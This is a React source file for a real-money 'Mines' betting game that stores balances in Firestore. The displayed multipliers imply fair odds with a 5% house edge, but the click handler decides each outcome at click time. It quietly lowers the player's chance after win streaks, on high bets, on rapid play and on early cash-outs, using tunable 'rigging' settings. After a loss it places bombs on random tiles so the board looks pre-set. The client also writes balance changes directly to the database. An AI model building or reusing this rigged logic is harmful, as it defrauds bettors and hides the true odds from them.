/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, Bomb, Star, RotateCcw, ShieldCheck, ChevronDown, Coins, Zap } from 'lucide-react';
import { useAuth } from '../AuthContext';
import { db, handleFirestoreError, OperationType } from '../firebase';
import { doc, updateDoc, increment, arrayUnion, serverTimestamp, onSnapshot } from 'firebase/firestore';

const GRID_SIZE = 25; // 5x5

interface TileState {
  index: number;
  isRevealed: boolean;
  type: 'star' | 'bomb';
}

export default function MinesGame({ onClose }: { onClose: () => void }) {
  const { user } = useAuth();
  const [minesCount, setMinesCount] = useState(3);
  const [betAmount, setBetAmount] = useState(10);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'ended'>('idle');
  const [tiles, setTiles] = useState<TileState[]>([]);
  const [revealedStars, setRevealedStars] = useState(0);
  const [currentMultiplier, setCurrentMultiplier] = useState(1.0);
  const [isAutoGame, setIsAutoGame] = useState(false);
  const [showMinesDropdown, setShowMinesDropdown] = useState(false);
  const [difficulty, setDifficulty] = useState<'easy' | 'medium' | 'hard'>('medium');
  const [riggingSettings, setRiggingSettings] = useState({
    highBetThreshold: 20,
    riggingIntensity: 0.5
  });

  // Track session stats for smarter, more subtle rigging
  const [sessionStats, setSessionStats] = useState({
    consecutiveWins: 0,
    lastGameTime: 0,
    shortGameCount: 0 // Track rapid 1-block cashouts
  });

  useEffect(() => {
    const configUnsub = onSnapshot(doc(db, 'settings', 'global'), (doc) => {
      if (doc.exists()) {
        const data = doc.data();
        setDifficulty(data.gameDifficulty || 'medium');
        setRiggingSettings({
          highBetThreshold: data.minesHighBetThreshold ?? 20,
          riggingIntensity: data.minesRiggingIntensity ?? 0.5
        });
      }
    }, (error) => {
      handleFirestoreError(error, OperationType.GET, 'settings/global');
    });
    return () => configUnsub();
  }, []);

  // Calculate next multiplier based on formula with 5% house edge
  const calculateMultiplier = (starsFound: number) => {
    if (starsFound === 0) return 1.0;
    
    // P = (Total-Mines)! / (Total-Mines-Stars)! * (Total-Stars)! / (Total)!
    // Simplification for each step: P_n = P_{n-1} * (Total - Mines - (n-1)) / (Total - (n-1))
    
    let prob = 1.0;
    for (let i = 0; i < starsFound; i++) {
      prob *= (GRID_SIZE - minesCount - i) / (GRID_SIZE - i);
    }
    
    const houseEdge = 0.95;
    return Number(((1 / prob) * houseEdge).toFixed(2));
  };

  const nextMultiplier = calculateMultiplier(revealedStars + 1);

  const startNewGame = async () => {
    if (!user || user.balance < betAmount) return;
    if (betAmount <= 0) return;

    // Detect rapid fire frequency
    const now = Date.now();
    const timeSinceLastGame = now - sessionStats.lastGameTime;
    const isRapidFire = timeSinceLastGame < 3500; // Less than 3.5s

    try {
      // Deduct bet
      const userRef = doc(db, 'users', user.id);
      await updateDoc(userRef, {
        balance: increment(-betAmount),
        updatedAt: serverTimestamp()
      });

      setTiles(Array.from({ length: GRID_SIZE }, (_, i) => ({
        index: i,
        isRevealed: false,
        type: 'star'
      })));
      setRevealedStars(0);
      setCurrentMultiplier(1.0);
      setGameState('playing');

      // Update session tracking
      setSessionStats(prev => ({
        ...prev,
        lastGameTime: now,
        // Increment short game count if they are playing too fast or winning streaks
        shortGameCount: isRapidFire ? prev.shortGameCount + 1 : Math.max(0, prev.shortGameCount - 0.5)
      }));
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, 'users');
    }
  };

  const handleTileClick = async (index: number) => {
    if (gameState !== 'playing' || tiles[index].isRevealed) return;

    const remainingSlots = GRID_SIZE - (tiles.filter(t => t.isRevealed).length);
    const remainingMines = minesCount;
    
    // BASE PROBABILITY
    let winProb = (remainingSlots - remainingMines) / remainingSlots;
    
    // SUBTLE RIGGING CALCULATIONS - Instead of forcing, we shave off probability
    
    // 1. Streak Penalty: For every consecutive win, reduce win prob by 3-7%
    const streakImpact = Math.min(0.25, sessionStats.consecutiveWins * 0.05);
    winProb *= (1 - streakImpact);

    // 2. High Bet Intensity: If betting above threshold, apply intensity multiplier
    if (betAmount >= riggingSettings.highBetThreshold) {
      const betRatio = Math.min(2, betAmount / riggingSettings.highBetThreshold);
      const intensityPenalty = riggingSettings.riggingIntensity * 0.3 * betRatio;
      winProb *= (1 - intensityPenalty);
    }

    // 3. Short Game Counter-Exploit: If they are rapid-starting or 1-block cashouting
    if (sessionStats.shortGameCount > 2) {
      const exploitPenalty = Math.min(0.4, (sessionStats.shortGameCount - 2) * 0.1);
      winProb *= (1 - exploitPenalty);
    }

    // 4. Subtle Profit Curve (Implicit 1.87x request)
    // As they get closer to 2x on high bets, increase risk gradually
    if (betAmount > 40 && calculateMultiplier(revealedStars + 1) > 1.5) {
      const profitRisk = (calculateMultiplier(revealedStars + 1) - 1.5) * 0.4;
      winProb *= (1 - Math.min(0.6, profitRisk));
    }

    // Apply difficulty weights
    if (difficulty === 'hard') winProb *= 0.9;
    else if (difficulty === 'easy' && betAmount < 20) winProb = Math.min(0.98, winProb * 1.15);

    // Safety Clamp: Never below 2% win chance per click, never above 98%
    winProb = Math.max(0.02, Math.min(0.98, winProb));
    
    let isBomb = Math.random() > winProb;

    const newTiles = [...tiles];
    if (isBomb) {
      // Game Over - Bomb
      newTiles[index] = { ...newTiles[index], isRevealed: true, type: 'bomb' };
      setGameState('ended');
      setSessionStats(prev => ({ ...prev, consecutiveWins: 0 }));
      
      // Reveal all bombs
      const bombsToReveal = minesCount;
      let revealedCount = 1;
      const bombIndices = new Set([index]);
      
      while (bombIndices.size < bombsToReveal) {
        const r = Math.floor(Math.random() * GRID_SIZE);
        bombIndices.add(r);
      }

      bombIndices.forEach(idx => {
        newTiles[idx] = { ...newTiles[idx], isRevealed: true, type: 'bomb' };
      });

      // All others reveal as stars
      for (let i = 0; i < GRID_SIZE; i++) {
        if (!newTiles[i].isRevealed) {
          newTiles[i] = { ...newTiles[i], isRevealed: true, type: 'star' };
        }
      }

      setTiles(newTiles);
      setGameState('ended');
      
      // Log loss
      if (user) {
        await updateDoc(doc(db, 'users', user.id), {
          history: arrayUnion({
            id: Date.now().toString(),
            game: 'Mines',
            amount: -betAmount,
            time: new Date().toISOString()
          })
        });
      }
    } else {
      // Star found
      newTiles[index] = { ...newTiles[index], isRevealed: true, type: 'star' };
      setTiles(newTiles);
      const newStarsCount = revealedStars + 1;
      setRevealedStars(newStarsCount);
      setCurrentMultiplier(calculateMultiplier(newStarsCount));

      // Auto cash out if no stars left or max reached (unlikely in mines)
      if (newStarsCount === GRID_SIZE - minesCount) {
        cashOut(calculateMultiplier(newStarsCount));
      }
    }
  };

  const cashOut = async (mult?: number) => {
    if (gameState !== 'playing' || !user) return;

    const winAmount = betAmount * (mult || currentMultiplier);

    // Update Session Stats for subtle rigging
    setSessionStats(prev => ({
      ...prev,
      consecutiveWins: prev.consecutiveWins + 1,
      // If cashed out early with few stars, increment shortGameCount to prevent exploits
      shortGameCount: revealedStars <= 2 ? prev.shortGameCount + 1 : Math.max(0, prev.shortGameCount - 0.5)
    }));
    
    try {
      const userRef = doc(db, 'users', user.id);
      await updateDoc(userRef, {
        balance: increment(winAmount),
        updatedAt: serverTimestamp(),
        history: arrayUnion({
          id: Date.now().toString(),
          game: 'Mines',
          amount: winAmount - betAmount,
          time: new Date().toISOString()
        })
      });

      // Reveal board
      const finalTiles = [...tiles];
      finalTiles.forEach(t => t.isRevealed = true);
      setTiles(finalTiles);
      setGameState('ended');
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, 'users');
    }
  };

  const randomClick = () => {
    if (gameState !== 'playing') return;
    const available = tiles.filter(t => !t.isRevealed).map(t => t.index);
    if (available.length > 0) {
      const randomId = available[Math.floor(Math.random() * available.length)];
      handleTileClick(randomId);
    }
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-0 md:p-4 bg-black/90 backdrop-blur-md overflow-hidden">
      <div className="w-full h-full md:h-auto md:max-w-md bg-[#0c1020] rounded-none md:rounded-[2.5rem] p-6 flex flex-col gap-6 border border-white/5 relative">
        <button onClick={onClose} className="absolute top-6 right-6 p-2 text-gray-500 hover:text-white z-10">
          <X className="w-6 h-6" />
        </button>

        {/* Top Info Bar */}
        <div className="flex items-center justify-between mt-4 relative">
          <div className="relative">
            <button 
              onClick={() => gameState === 'idle' && setShowMinesDropdown(!showMinesDropdown)}
              className="flex items-center gap-2 bg-[#212946] px-4 py-2 rounded-lg text-xs font-bold text-white border border-white/10"
            >
              Mines: {minesCount} <ChevronDown className="w-4 h-4 text-blue-400" />
            </button>
            {showMinesDropdown && (
              <div className="absolute top-full left-0 mt-2 w-32 bg-[#1a1f35] border border-white/10 rounded-xl overflow-hidden z-20 shadow-2xl">
                {[1, 3, 5, 10, 20, 24].map(num => (
                  <button 
                    key={num}
                    onClick={() => { setMinesCount(num); setShowMinesDropdown(false); }}
                    className="w-full text-left px-4 py-2 text-xs font-bold text-gray-400 hover:bg-[#ff007b] hover:text-white"
                  >
                    {num} Mines
                  </button>
                ))}
              </div>
            )}
          </div>

          <div className="absolute left-1/2 -translate-x-1/2">
             <div className="bg-[#ff8a00] text-white px-4 py-0.5 rounded-md text-[10px] font-black uppercase tracking-widest shadow-lg shadow-orange-500/20 whitespace-nowrap">
                MINE GAME
             </div>
          </div>

          <div className="bg-[#ffb800] px-4 py-2 rounded-lg border border-white/10 shadow-lg">
             <span className="text-[9px] text-[#4d3e00] font-black uppercase tracking-widest block leading-tight">Next:</span>
             <span className="text-sm font-black text-[#4d3e00] italic">{nextMultiplier.toFixed(2)}x</span>
          </div>
        </div>

        {/* Current Win Indicator */}
        {gameState === 'playing' && (
          <motion.div 
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-center py-2"
          >
             <span className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-500">Current Win</span>
             <div className="text-2xl font-black text-white italic">
               ${(betAmount * currentMultiplier).toFixed(2)}
             </div>
          </motion.div>
        )}

        {/* Grid Area */}
        <div className="grid grid-cols-5 gap-2.5 aspect-square w-full p-2 bg-[#161c32]/50 rounded-[2rem] border border-white/5">
           {tiles.length > 0 ? (
             tiles.map((tile, i) => (
               <Tile 
                key={i} 
                tile={tile} 
                onClick={() => handleTileClick(i)} 
                disabled={gameState !== 'playing'}
               />
             ))
           ) : (
             Array.from({ length: 25 }).map((_, i) => (
               <div key={i} className="bg-[#1a1f35] rounded-xl aspect-square animate-pulse" />
             ))
           )}
        </div>

        {/* Controls */}
        <div className="space-y-4">
          <div className="flex items-center justify-between px-2">
            <button 
              onClick={randomClick}
              disabled={gameState !== 'playing'}
              className="px-6 py-2 rounded-xl bg-[#212946] text-[10px] font-black uppercase tracking-widest text-blue-400 border border-white/5 active:scale-95 disabled:opacity-50"
            >
              RANDOM
            </button>
            <div className="flex items-center gap-4">
              <RotateCcw className="w-5 h-5 text-gray-500 hover:text-white cursor-pointer active:rotate-180 transition-all" />
              <div className="flex items-center gap-2">
                <div 
                  onClick={() => setIsAutoGame(!isAutoGame)}
                  className={`w-10 h-5 rounded-full relative transition-all cursor-pointer ${isAutoGame ? 'bg-blue-500' : 'bg-[#1a1f35]'}`}
                >
                  <div className={`absolute top-1 bottom-1 w-3 h-3 bg-white rounded-full transition-all ${isAutoGame ? 'right-1' : 'left-1'}`} />
                </div>
                <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Auto Game</span>
              </div>
            </div>
          </div>

          <div className="space-y-3">
             <div className="flex gap-4">
                {/* Bet Input Container */}
                <div className="flex-1 bg-[#212946] rounded-2xl flex items-center px-4 py-3 border border-white/5">
                   <div className="flex-1">
                     <span className="text-[8px] text-gray-500 font-black uppercase block tracking-widest mb-1">Bet USD</span>
                     <div className="flex items-center gap-2">
                        <Coins className="w-4 h-4 text-blue-400" />
                        <input 
                          type="number"
                          value={betAmount}
                          onChange={(e) => setBetAmount(Number(e.target.value))}
                          disabled={gameState === 'playing'}
                          className="bg-transparent text-white font-black text-lg outline-none w-20"
                        />
                     </div>
                   </div>
                </div>

                {/* Big Action Button */}
                {gameState === 'playing' ? (
                  <button 
                    onClick={() => cashOut()}
                    className="flex-[1.5] bg-[#ffb800] rounded-2xl flex flex-col items-center justify-center shadow-lg shadow-yellow-500/10 active:scale-95 transition-all"
                  >
                    <span className="text-2xl font-black text-[#4d3e00] italic tracking-tighter">CASH OUT</span>
                    <span className="text-[10px] text-[#4d3e00]/70 font-bold uppercase tracking-widest leading-none">
                      {(betAmount * currentMultiplier).toFixed(2)}
                    </span>
                  </button>
                ) : (
                  <button 
                    onClick={startNewGame}
                    disabled={!user || user.balance < betAmount}
                    className="flex-[1.5] bg-[#28a745] hover:bg-[#218838] rounded-2xl flex items-center justify-center gap-3 shadow-lg shadow-green-500/20 active:scale-95 transition-all group disabled:grayscale disabled:opacity-50"
                  >
                    <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center group-hover:scale-110 transition-transform">
                       <Zap className="w-5 h-5 text-white fill-current" />
                    </div>
                    <span className="text-3xl font-black text-white italic tracking-tighter">BET</span>
                  </button>
                )}
             </div>
          </div>
        </div>
      </div>
    </div>
  );
}

const Tile: React.FC<{ tile: TileState; onClick: () => void | Promise<void>; disabled: boolean }> = ({ tile, onClick, disabled }) => {
  return (
    <button
      onClick={onClick}
      disabled={disabled || tile.isRevealed}
      className={`relative aspect-square rounded-xl transition-all duration-300 transform ${
        tile.isRevealed 
          ? 'scale-100' 
          : 'bg-[#1a1f35] hover:bg-[#252b45] hover:scale-105 active:scale-95 shadow-lg'
      } flex items-center justify-center overflow-hidden`}
    >
      <AnimatePresence mode="wait">
        {!tile.isRevealed ? (
          <motion.div 
            key="hidden"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="w-4 h-4 rounded-full bg-[#2a3149]"
          />
        ) : tile.type === 'star' ? (
          <motion.div 
            key="star"
            initial={{ scale: 0, rotate: -45 }}
            animate={{ scale: 1, rotate: 0 }}
            className="w-full h-full flex items-center justify-center bg-gradient-to-br from-yellow-300 to-amber-500"
          >
            <Star className="w-6 h-6 text-white fill-current" />
          </motion.div>
        ) : (
          <motion.div 
            key="bomb"
            initial={{ scale: 0, rotate: 45 }}
            animate={{ scale: 1, rotate: 0 }}
            className="w-full h-full flex items-center justify-center bg-gradient-to-br from-red-500 to-red-800"
          >
            <div className="absolute inset-0 bg-red-600/20 animate-ping" />
            <Bomb className="w-6 h-6 text-white" />
          </motion.div>
        )}
      </AnimatePresence>
    </button>
  );
}
